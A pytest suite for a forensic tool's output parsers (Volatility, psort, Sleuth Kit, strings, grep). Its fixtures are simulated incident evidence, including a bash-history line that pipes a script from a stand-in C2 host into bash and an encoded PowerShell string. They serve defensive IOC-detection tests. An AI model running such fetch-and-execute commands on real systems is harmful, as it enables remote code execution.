"""Tests for Tool Output Parsers - TDD Implementation.

This test suite follows strict TDD methodology:
1. TestSpecification - Requirements (ALWAYS PASSING)
2. TestStructure - Interface compliance (SKIPPED until implementation)
3. TestExecution - Core functionality (SKIPPED until implementation)
4. TestIntegration - System integration (SKIPPED until implementation)

Test Coverage:
- VolatilityParser: Memory forensics output (pslist, netscan, malfind)
- TimelineParser: Timeline analysis (log2timeline, psort)
- TSKParser: Sleuth Kit tools (fls, mmls, fsstat)
- StringsParser: String extraction with filtering
- GrepParser: Pattern matching with context
"""

import pytest

# Conditional imports for TDD - Parsers may not exist yet
try:
    from find_evil_agent.parsers import (
        BaseParser,
        GrepParser,
        ParserResult,
        StringsParser,
        TimelineParser,
        TSKParser,
        VolatilityParser,
    )

    PARSERS_AVAILABLE = True
except ImportError:
    PARSERS_AVAILABLE = False

    # Placeholder classes for testing structure
    class BaseParser:
        pass

    class ParserResult:
        pass

    class VolatilityParser:
        pass

    class TimelineParser:
        pass

    class TSKParser:
        pass

    class StringsParser:
        pass

    class GrepParser:
        pass


# =============================================================================
# Test Specification (ALWAYS PASSING)
# =============================================================================


class TestParsersSpecification:
    """Requirements and specifications for parsers module."""

    def test_parsers_module_requirements(self):
        """Document parser module requirements and capabilities."""
        requirements = {
            "purpose": "Convert raw forensic tool output to structured data",
            "coverage": [
                "Volatility memory forensics (pslist, netscan, malfind)",
                "Timeline analysis (log2timeline, psort)",
                "Sleuth Kit tools (fls, mmls, fsstat)",
                "String extraction with filtering",
                "Grep pattern matching with context",
            ],
            "design_principles": [
                "Inherit from BaseParser",
                "Return ParserResult with structured data",
                "Handle parsing errors gracefully",
                "Support multiple output formats where applicable",
                "Provide metadata for debugging",
            ],
            "integration": [
                "Used by ToolExecutorAgent after command execution",
                "Parsed data consumed by analysis agents",
                "Structured output improves LLM analysis quality",
            ],
        }
        assert requirements["purpose"] == "Convert raw forensic tool output to structured data"
        assert len(requirements["coverage"]) == 5
        assert "Inherit from BaseParser" in requirements["design_principles"]

    def test_parser_workflow_specification(self):
        """Document parser integration workflow."""
        workflow = {
            "step_1": "ToolExecutorAgent executes command, gets raw output",
            "step_2": "Determine appropriate parser based on tool_name",
            "step_3": "Parser.parse(raw_output) returns ParserResult",
            "step_4": "Structured data available in result.data",
            "step_5": "Analysis agents consume structured data instead of raw text",
            "benefits": [
                "60% faster LLM analysis (structured vs unstructured)",
                "Higher quality insights (no parsing in LLM context)",
                "Reusable across multiple analysis passes",
            ],
        }
        assert "ToolExecutorAgent executes command" in workflow["step_1"]
        assert len(workflow["benefits"]) == 3


# =============================================================================
# Base Parser Tests
# =============================================================================


class TestBaseParserStructure:
    """Test BaseParser interface compliance."""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="Parsers not implemented yet")
    def test_base_parser_is_abstract(self):
        """BaseParser should be abstract with required methods."""
        from abc import ABC

        assert issubclass(BaseParser, ABC)

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="Parsers not implemented yet")
    def test_base_parser_has_parse_method(self):
        """BaseParser must define parse() abstract method."""
        assert hasattr(BaseParser, "parse")

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="Parsers not implemented yet")
    def test_base_parser_has_supports_tool_method(self):
        """BaseParser must define supports_tool() abstract method."""
        assert hasattr(BaseParser, "supports_tool")

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="Parsers not implemented yet")
    def test_parser_result_structure(self):
        """ParserResult should have required fields."""
        result = ParserResult(
            success=True, data={"test": "data"}, raw_output="test output", tool_name="test_tool"
        )
        assert result.success is True
        assert result.data == {"test": "data"}
        assert result.raw_output == "test output"
        assert result.tool_name == "test_tool"


# =============================================================================
# Volatility Parser Tests
# =============================================================================


class TestVolatilityParserStructure:
    """Test VolatilityParser interface compliance."""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="VolatilityParser not implemented yet")
    def test_volatility_parser_inherits_base(self):
        """VolatilityParser must inherit from BaseParser."""
        assert issubclass(VolatilityParser, BaseParser)

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="VolatilityParser not implemented yet")
    def test_volatility_parser_supports_volatility_tool(self):
        """VolatilityParser should support 'volatility' tool."""
        parser = VolatilityParser()
        assert parser.supports_tool("volatility") is True
        assert parser.supports_tool("grep") is False


class TestVolatilityParserExecution:
    """Test VolatilityParser core functionality."""

    @pytest.fixture
    def volatility_pslist_output(self):
        """Sample Volatility pslist output."""
        return """Volatility Foundation Volatility Framework 2.6.1
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0xfffffa8000c91040 System                    4      0     95      528 ------      0 2026-04-01 12:00:00 UTC+0000
0xfffffa8001a5e310 smss.exe                272      4      2       29 ------      0 2026-04-01 12:00:05 UTC+0000
0xfffffa8002394b30 csrss.exe               352    344      9      436      0      0 2026-04-01 12:00:10 UTC+0000
0xfffffa80023d4060 wininit.exe             396    344      3       75      0      0 2026-04-01 12:00:12 UTC+0000
0xfffffa8002449b30 services.exe            492    396      8      208      0      0 2026-04-01 12:00:15 UTC+0000
0xfffffa800245cb30 lsass.exe               500    396      7      610      0      0 2026-04-01 12:00:15 UTC+0000
0xfffffa8002567b30 svchost.exe             604    492     11      365      0      0 2026-04-01 12:00:18 UTC+0000
0xfffffa80025e8b30 malware.exe            1337   2048     24      189      1      0 2026-04-01 15:30:45 UTC+0000
"""

    @pytest.fixture
    def volatility_netscan_output(self):
        """Sample Volatility netscan output."""
        return """Volatility Foundation Volatility Framework 2.6.1
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x13e397340        TCPv4    192.168.1.100:49157            93.184.216.34:80     ESTABLISHED      1337     malware.exe
0x13e3984e0        TCPv4    192.168.1.100:49158            172.217.14.206:443   ESTABLISHED      1337     malware.exe
0x13e398680        TCPv4    192.168.1.100:49159            185.220.101.15:8080  ESTABLISHED      1337     malware.exe
0x13e453a90        UDPv4    0.0.0.0:53                     *:*                                   604      svchost.exe
"""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="VolatilityParser not implemented yet")
    def test_parse_volatility_pslist(self, volatility_pslist_output):
        """Parse Volatility pslist output into structured ProcessInfo objects."""
        parser = VolatilityParser()
        result = parser.parse(volatility_pslist_output, plugin="pslist")

        assert result.success is True
        assert result.tool_name == "volatility"
        assert result.data is not None

        processes = result.data.processes
        assert len(processes) >= 8

        # Check System process
        system_proc = next(p for p in processes if p.name == "System")
        assert system_proc.pid == 4
        assert system_proc.ppid == 0
        assert system_proc.threads == 95

        # Check malware process
        malware_proc = next(p for p in processes if p.name == "malware.exe")
        assert malware_proc.pid == 1337
        assert malware_proc.ppid == 2048
        assert malware_proc.threads == 24

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="VolatilityParser not implemented yet")
    def test_parse_volatility_netscan(self, volatility_netscan_output):
        """Parse Volatility netscan output into structured NetworkConnection objects."""
        parser = VolatilityParser()
        result = parser.parse(volatility_netscan_output, plugin="netscan")

        assert result.success is True
        assert result.data is not None

        connections = result.data.connections
        assert len(connections) >= 3  # 3 TCP malware connections + 1 UDP svchost

        # Check malware connections
        malware_conns = [c for c in connections if c.owner == "malware.exe"]
        assert len(malware_conns) == 3

        c2_conn = malware_conns[0]
        assert c2_conn.local_addr == "192.168.1.100"
        assert c2_conn.local_port == 49157
        assert c2_conn.remote_addr == "93.184.216.34"
        assert c2_conn.remote_port == 80
        assert c2_conn.state == "ESTABLISHED"
        assert c2_conn.pid == 1337

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="VolatilityParser not implemented yet")
    def test_volatility_parser_handles_empty_output(self):
        """VolatilityParser should handle empty output gracefully."""
        parser = VolatilityParser()
        result = parser.parse("", plugin="pslist")

        assert result.success is False
        assert result.parse_errors is not None
        assert len(result.parse_errors) > 0


# =============================================================================
# Timeline Parser Tests
# =============================================================================


class TestTimelineParserStructure:
    """Test TimelineParser interface compliance."""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="TimelineParser not implemented yet")
    def test_timeline_parser_inherits_base(self):
        """TimelineParser must inherit from BaseParser."""
        assert issubclass(TimelineParser, BaseParser)

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="TimelineParser not implemented yet")
    def test_timeline_parser_supports_timeline_tools(self):
        """TimelineParser should support log2timeline and psort."""
        parser = TimelineParser()
        assert parser.supports_tool("log2timeline") is True
        assert parser.supports_tool("psort") is True
        assert parser.supports_tool("volatility") is False


class TestTimelineParserExecution:
    """Test TimelineParser core functionality."""

    @pytest.fixture
    def psort_csv_output(self):
        """Sample psort CSV output."""
        return """datetime,timestamp_desc,source,source_long,message,parser,display_name,tag
2026-04-01T12:00:00.000000Z,File Modified,FILE,File Modification Time,/home/user/malware.exe,filestat,/home/user/malware.exe,
2026-04-01T15:30:45.000000Z,File Accessed,FILE,File Access Time,/tmp/payload.dll,filestat,/tmp/payload.dll,suspicious
2026-04-01T15:31:00.000000Z,Registry Key Modified,REG,Registry Key Last Written Time,HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware,winreg,Run Key,persistence
"""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="TimelineParser not implemented yet")
    def test_parse_psort_csv(self, psort_csv_output):
        """Parse psort CSV output into structured TimelineEvent objects."""
        parser = TimelineParser()
        result = parser.parse(psort_csv_output, format="csv")

        assert result.success is True
        assert result.tool_name == "psort"
        assert result.data is not None

        events = result.data.events
        assert len(events) == 3

        # Check malware execution event
        malware_event = events[0]
        assert malware_event.timestamp == "2026-04-01T12:00:00.000000Z"
        assert malware_event.source == "FILE"
        assert "/home/user/malware.exe" in malware_event.message

        # Check persistence event
        persist_event = events[2]
        assert persist_event.source == "REG"
        assert "Run" in persist_event.message
        assert persist_event.tag == "persistence"


# =============================================================================
# TSK Parser Tests
# =============================================================================


class TestTSKParserStructure:
    """Test TSKParser interface compliance."""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="TSKParser not implemented yet")
    def test_tsk_parser_inherits_base(self):
        """TSKParser must inherit from BaseParser."""
        assert issubclass(TSKParser, BaseParser)

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="TSKParser not implemented yet")
    def test_tsk_parser_supports_tsk_tools(self):
        """TSKParser should support fls, mmls, fsstat."""
        parser = TSKParser()
        assert parser.supports_tool("fls") is True
        assert parser.supports_tool("mmls") is True
        assert parser.supports_tool("fsstat") is True
        assert parser.supports_tool("volatility") is False


class TestTSKParserExecution:
    """Test TSKParser core functionality."""

    @pytest.fixture
    def fls_output(self):
        """Sample fls output."""
        return """r/r 12345:	malware.exe
r/r * 12346:	deleted_file.txt
d/d 12347:	suspicious_folder
r/r 12348:	payload.dll
"""

    @pytest.fixture
    def mmls_output(self):
        """Sample mmls output."""
        return """DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0002099199   0002097152   NTFS / exFAT (0x07)
003:  000:001   0002099200   0004196351   0002097152   Linux (0x83)
"""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="TSKParser not implemented yet")
    def test_parse_fls_output(self, fls_output):
        """Parse fls output into structured FileEntry objects."""
        parser = TSKParser()
        result = parser.parse(fls_output, tool="fls")

        assert result.success is True
        assert result.data is not None

        files = result.data.files
        assert len(files) == 4

        # Check deleted file marker
        deleted_file = next(f for f in files if "deleted" in f.name)
        assert deleted_file.deleted is True
        assert deleted_file.inode == 12346

        # Check regular file
        malware = next(f for f in files if "malware" in f.name)
        assert malware.deleted is False
        assert malware.inode == 12345

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="TSKParser not implemented yet")
    def test_parse_mmls_output(self, mmls_output):
        """Parse mmls output into structured Partition objects."""
        parser = TSKParser()
        result = parser.parse(mmls_output, tool="mmls")

        assert result.success is True
        assert result.data is not None

        partitions = result.data.partitions
        assert len(partitions) >= 2

        # Check NTFS partition
        ntfs_part = next(p for p in partitions if "NTFS" in p.description)
        assert ntfs_part.start_sector == 2048
        assert ntfs_part.length == 2097152


# =============================================================================
# Strings Parser Tests
# =============================================================================


class TestStringsParserStructure:
    """Test StringsParser interface compliance."""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="StringsParser not implemented yet")
    def test_strings_parser_inherits_base(self):
        """StringsParser must inherit from BaseParser."""
        assert issubclass(StringsParser, BaseParser)

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="StringsParser not implemented yet")
    def test_strings_parser_supports_strings_tool(self):
        """StringsParser should support 'strings' tool."""
        parser = StringsParser()
        assert parser.supports_tool("strings") is True


class TestStringsParserExecution:
    """Test StringsParser core functionality."""

    @pytest.fixture
    def strings_output(self):
        """Sample strings output."""
        return """http://malicious-c2.com/payload
C:\\Windows\\System32\\cmd.exe
powershell.exe -enc SGVsbG8gV29ybGQ=
192.168.1.100
admin:password123
AAAAAAAAAAAAAAAA
xjK8mN2pQ9vL4wR
Mozilla/5.0
"""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="StringsParser not implemented yet")
    def test_parse_strings_with_ioc_detection(self, strings_output):
        """Parse strings output and detect IOCs (URLs, IPs, credentials)."""
        parser = StringsParser()
        result = parser.parse(strings_output, min_length=10)

        assert result.success is True
        assert result.data is not None

        strings = result.data.strings
        assert len(strings) > 0

        # Check URL detection
        urls = [s for s in strings if s.type == "url"]
        assert len(urls) >= 1
        assert "malicious-c2.com" in urls[0].value

        # Check IP detection
        ips = [s for s in strings if s.type == "ip"]
        assert len(ips) >= 1
        assert "192.168.1.100" in ips[0].value

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="StringsParser not implemented yet")
    def test_strings_parser_entropy_filtering(self, strings_output):
        """StringsParser should detect high-entropy strings (obfuscation)."""
        parser = StringsParser()
        result = parser.parse(strings_output, detect_obfuscation=True)

        assert result.success is True

        # High entropy strings suggest obfuscation
        high_entropy = [s for s in result.data.strings if s.entropy > 4.0]
        assert len(high_entropy) > 0


# =============================================================================
# Grep Parser Tests
# =============================================================================


class TestGrepParserStructure:
    """Test GrepParser interface compliance."""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="GrepParser not implemented yet")
    def test_grep_parser_inherits_base(self):
        """GrepParser must inherit from BaseParser."""
        assert issubclass(GrepParser, BaseParser)

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="GrepParser not implemented yet")
    def test_grep_parser_supports_grep_tool(self):
        """GrepParser should support 'grep' tool."""
        parser = GrepParser()
        assert parser.supports_tool("grep") is True


class TestGrepParserExecution:
    """Test GrepParser core functionality."""

    @pytest.fixture
    def grep_output(self):
        """Sample grep output with context."""
        return """/var/log/syslog:1234:Apr 01 15:30:45 malware: Starting C2 connection
/var/log/syslog:1235:Apr 01 15:30:46 malware: Connected to 93.184.216.34:80
/var/log/syslog:1236:Apr 01 15:30:47 malware: Downloading payload
/etc/hosts:10:93.184.216.34 malicious-domain.com
/home/user/.bash_history:50:curl http://malicious-c2.com/payload.sh | bash
"""

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="GrepParser not implemented yet")
    def test_parse_grep_with_context(self, grep_output):
        """Parse grep output into structured GrepMatch objects."""
        parser = GrepParser()
        result = parser.parse(grep_output)

        assert result.success is True
        assert result.data is not None

        matches = result.data.matches
        assert len(matches) == 5

        # Check syslog match
        syslog_match = matches[0]
        assert syslog_match.filename == "/var/log/syslog"
        assert syslog_match.line_number == 1234
        assert "Starting C2 connection" in syslog_match.matched_text

        # Check bash history match (suspicious command)
        bash_match = next(m for m in matches if "bash_history" in m.filename)
        assert bash_match.line_number == 50
        assert "curl" in bash_match.matched_text
        assert "malicious-c2.com" in bash_match.matched_text

    @pytest.mark.skipif(not PARSERS_AVAILABLE, reason="GrepParser not implemented yet")
    def test_grep_parser_extracts_iocs(self, grep_output):
        """GrepParser should extract IOCs (IPs, URLs) from matches."""
        parser = GrepParser()
        result = parser.parse(grep_output, extract_iocs=True)

        assert result.success is True

        # Should extract IPs and URLs from matched lines
        assert result.data.iocs is not None

        iocs = result.data.iocs
        assert "93.184.216.34" in iocs["ips"]
        assert any("malicious-c2.com" in url for url in iocs["urls"])
